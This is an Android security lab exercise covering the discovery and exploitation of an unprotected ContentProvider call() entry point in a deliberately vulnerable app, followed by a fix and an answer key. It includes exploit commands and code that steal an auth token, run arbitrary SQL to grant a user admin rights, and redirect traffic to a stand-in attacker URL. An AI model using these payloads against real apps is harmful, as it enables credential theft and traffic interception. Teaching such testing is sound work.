# Lab 04 — `call()` as an Unprotected RPC Entry Point

**Difficulty:** Advanced
**Time:** 2–3 hours
**Prerequisites:** [Lab 01](lab-01-enumerate-and-read.md),
[Chapter 27 §3.3](../README.md#33-the-provider-contract-seven-methods),
[§5.5](../README.md#55-call-as-an-unprotected-rpc-entry-point),
[56-JADX](../../56-JADX/README.md), Frida.

---

## Objective

Discover the undocumented `call()` methods a provider exposes using **three independent techniques**,
then exploit the most dangerous one to steal an authentication token and to run arbitrary SQL — all from
an unprivileged app. You will finish understanding why `call()` is, per the chapter, "the single most
under-tested part of the Android component surface".

## Why this matters

`ContentProvider.call()` is a generic remote procedure call: a method-name string in, an arbitrary
`Bundle` out. It has three properties that compound into the highest-yield, least-tested finding class
in the chapter:

- **No automatic permission check.** There is no URI, so no URI-scoped check is even expressible, and
  `Transport.call()` performs no read/write enforcement. On a provider exported with no declared
  permission, `call()` is completely open.
- **Invisible in the manifest.** No `<intent-filter>`, no path, no declared method list. A reviewer
  reading configuration cannot see it exists. It survives code review for this reason.
- **It does privileged things.** Developers reach for `call()` precisely when the operation does not fit
  query/insert/update/delete — which in practice means `getAuthToken`, `execSql`, `setServerUrl`,
  `enableDebug`, `wipe`. It is a back-channel built for internal use, and internal use is privileged.

> **Definition**
> **`ContentProvider.call(method, arg, extras)`** is a schema-less, type-unsafe, unauthenticated (by
> default) RPC. The caller names a method and passes a string and a `Bundle`; the provider does whatever
> that name means and returns a `Bundle`. Neither Drozer nor MobSF enumerates it — discovering the
> method names is the entire difficulty, and this lab is about the four ways to do it.

The target is `VulnerableNotesProvider` from Lab 01, whose `call()` (defect 7 in
[../examples/VulnerableNotesProvider.java](../examples/VulnerableNotesProvider.java)) implements
`getAuthToken`, `setServerUrl`, `enableDebug`, `execSql` and `wipe`, and returns `null` for anything
else.

---

## Setup

```bash
# host — confirm the target from Lab 01 is installed and exported
adb shell dumpsys package com.example.vuln | grep -A6 "Provider{"

# adb shell — a naive call with a name you invented returns null (no method matched)
content call --uri content://com.example.vuln.notes.provider --method thisDoesNotExist
```

the provider gives you *nothing* to go on: the manifest names no methods, and an unknown
method returns `null` rather than an error. Discovery is the work.

---

## Steps

### Step 1 — Technique 1: read the switch in JADX (the definitive answer)

When you have the APK, the method names are right there in the `call()` override.

```bash
# host
adb shell pm path com.example.vuln
adb pull <the base.apk path> ./target.apk
jadx -d out/ ./target.apk
grep -rn -A40 "public Bundle call" out/sources/
```

**Q1.** List every method name and what each does. Which one is the highest severity, and why?

### Step 2 — Technique 2: pull method-name strings from the DEX

When the code is obfuscated, class and field names vanish but the *strings* survive, because they are
compared against at runtime.

```bash
# host
unzip -o ./target.apk 'classes*.dex' -d dex/
strings -a dex/classes*.dex \
  | grep -E "^(get|set|is|do|run|exec|enable|disable|wipe|clear|sync|refresh|auth|token|debug)[A-Za-z]*$" \
  | sort -u
```

**Q2.** Do the method names appear in the string dump? Which of the two techniques so far survives
string encryption (DexGuard-class obfuscation), and which does not?

### Step 3 — Technique 3: hook `call()` and use the app

The app's own components invoke these methods. Watch them go past.

```bash
# host — spawn so you catch early calls; forces the DB seed too
frida -U -f com.example.vuln -l ../scripts/hook-provider.js
```

Then exercise the target app's UI (or trigger its widget/sync). Read the `[CALL]` lines the hook prints.

**Q3.** Which methods did the app call on its own? What does hooking give you that static analysis does
not, when the strings are encrypted?

### Step 4 — Technique 4: brute force with the fuzzer

The fourth technique needs neither the APK nor the running app to cooperate: guess, using the
return-value difference as an oracle.

```bash
# host — the chapter fuzzer; --fuzz-args also probes each live method's argument
python3 ../scripts/provider-call-fuzz.py \
  --authority com.example.vuln.notes.provider --mode call --fuzz-args
```

**Q4.** Which methods did the fuzzer find live? The vulnerable provider returns `null` for unknown
methods — explain why that makes the oracle *weaker* but not useless, and what a provider that `throw`s
on unknown methods reveals instead.

### Step 5 — Exploit the token leak

```bash
# adb shell — the direct call
content call --uri content://com.example.vuln.notes.provider --method getAuthToken
```

Then from an unprivileged app — this is the evidence for the report:

```java
// probe app — the whole exploit
Bundle r = getContentResolver().call(
        Uri.parse("content://com.example.vuln.notes.provider"),
        "getAuthToken", null, null);
Log.i("PROBE", "token = " + (r == null ? "null" : r.getString("token")));
```

**Q5.** Did the token come back to the app? What is the business impact if this token authenticates to
the app's backend?

### Step 6 — Exploit `execSql` and `setServerUrl`

```bash
# adb shell — arbitrary write via execSql
content call --uri content://com.example.vuln.notes.provider \
  --method execSql --arg "UPDATE users SET role='admin' WHERE username='alice'"

# adb shell — persistent man-in-the-middle via setServerUrl
content call --uri content://com.example.vuln.notes.provider \
  --method setServerUrl --arg "https://attacker.invalid/collect"
```

**Q6.** `execSql` and `setServerUrl` have very different impact profiles. Classify each (confidentiality
/ integrity / availability), and say which is persistent.

### Step 7 — Apply the fix and re-test

Replace the provider's `call()` with the hardened version from
[../examples/SecureNotesProvider.java](../examples/SecureNotesProvider.java): `enforceCaller()` first, a
closed method set, `throw` on unknown, and debug methods compiled out under `BuildConfig.DEBUG`. Rebuild,
reinstall, and re-run every call from Steps 5–6.

**Q7.** What happens now when you call `getAuthToken` from the shell? From the unprivileged app? Explain
the difference in terms of `enforceCaller()` and `Binder.getCallingUid()`.

**Q8.** The fix uses `Binder.getCallingUid()` rather than `getCallingPackage()` for the trust decision.
Why is the UID the right thing to check, and what makes `getCallingPackage()` unreliable for a hard
security decision?

**Q9.** The hardened `call()` `throw`s on an unknown method instead of returning `null`. The chapter
says this is *good for your developers but not a real control*. Explain both halves of that claim.

---

## Hints

<details>
<summary>Hint 1 — content call returns nothing for every method</summary>

`null` is the correct response for a method the provider does not handle. It is not an error and not a
crash. Confirm the authority is right first (`content query --uri content://.../notes` should work), then
work through the method wordlist — the fuzzer automates this.
</details>

<details>
<summary>Hint 2 — the Frida hook shows no [CALL] lines</summary>

The app only calls these methods when its own code paths run. Launch it, navigate, trigger any sync or
widget. If the app is heavily AOT-compiled and the hook seems to miss, force interpretation first
(see [13-ART](../../13-ART/README.md)):

```bash
adb shell cmd package compile -m verify -f com.example.vuln
adb shell am force-stop com.example.vuln
```
</details>

<details>
<summary>Hint 3 — execSql throws</summary>

`execSQL` refuses statements that return rows (it is for non-query SQL). Use `UPDATE`/`INSERT`/`DELETE`
/`CREATE`, not `SELECT`. To *read* via `call`, you would need a method that returns query results, or
combine with the projection injection from Lab 02.
</details>

---

## Solution

<details>
<summary>Answers</summary>

**Q1.** `getAuthToken` (returns the session token — account takeover), `setServerUrl` (persistent MITM),
`enableDebug` (toggles a debug flag), `execSql` (arbitrary DB read/write), `wipe` (deletes notes —
availability). Highest severity is `getAuthToken` or `execSql`: the former is direct credential theft,
the latter is arbitrary data read and write.

**Q2.** Yes, the names appear in the string dump. Techniques 1 (JADX) and 2 (strings) both fail against
a string-*encryption* obfuscator, because the constants are decrypted only at runtime. Techniques 3
(hook) and 4 (brute force) still work, because the strings are plaintext by the time they are compared.

**Q3.** The app calls whatever its widget/sync/companion flows use — commonly `getAuthToken` and a
config getter. Hooking gives you the method names *and their arguments and return values* in plaintext
even under string encryption, because you observe them after decryption at the comparison point. Static
analysis of an encrypted-string APK gives you neither.

**Q4.** The fuzzer finds the live methods by sending each candidate and classifying the response. Because
the provider returns `null` for unknown methods, a live method that happens to return `null` (or an empty
Bundle) looks the same as an unknown one — so the oracle can produce false negatives. A provider that
`throw`s `IllegalArgumentException` on unknown methods is a *stronger* oracle: the thrown-vs-returned
difference cleanly separates implemented from unimplemented names.

**Q5.** Yes, the token returns to the app. If it authenticates to the backend, any installed app obtains
the user's session — account takeover, no user interaction, one API call. Critical.

**Q6.** `execSql` is integrity + confidentiality (arbitrary write and, combined with a read method,
arbitrary read); its effect is persistent in the database. `setServerUrl` is integrity + confidentiality
(all future traffic goes to the attacker) and is persistent across restarts because it is written to
`SharedPreferences`. Both are worse than a one-shot read.

**Q7.** From the shell, `getAuthToken` now throws `SecurityException` — the shell's UID 2000 is not the
app's UID and not same-signature, so `enforceCaller()` rejects it. From the unprivileged probe app, it
also throws `SecurityException` for the same reason. The provider is now reachable only by same-signature
allow-listed packages.

**Q8.** `Binder.getCallingUid()` returns the UID the kernel authenticated for the Binder transaction; it
cannot be spoofed. `getCallingPackage()` returns the *first* package name for that UID, which is
ambiguous when several packages share a UID (`sharedUserId`), and is only meaningful during a
transaction. For a trust decision, authenticate the UID and, if you need a package, enumerate all
packages for that UID and check them explicitly.

**Q9.** Good for developers: a thrown exception gives your own team a clear, debuggable error instead of
a silent `null`. Not a real control: a determined attacker maps the method set either way (via JADX,
strings, hooks or brute force), so the throw-vs-null ambiguity never actually prevents discovery — it is
a usability choice, not a security boundary. The security boundary is `enforceCaller()`.

</details>

---

## Success criteria

- [ ] You enumerated the `call()` methods by reading the JADX switch statement
- [ ] You recovered the same names from the DEX string table and can say which obfuscation defeats that
- [ ] You captured live method calls (and their args/returns) with a Frida hook
- [ ] You brute-forced the method set with the fuzzer and explained why `null`-on-unknown weakens the oracle
- [ ] You stole the auth token via `call()` from an unprivileged app
- [ ] You demonstrated `execSql` (arbitrary write) and `setServerUrl` (persistent MITM)
- [ ] You applied the hardened `call()` and confirmed shell and app are both now denied
- [ ] You can explain why `Binder.getCallingUid()` is the right identity to check
- [ ] You can explain why `throw`-on-unknown helps developers but is not a control
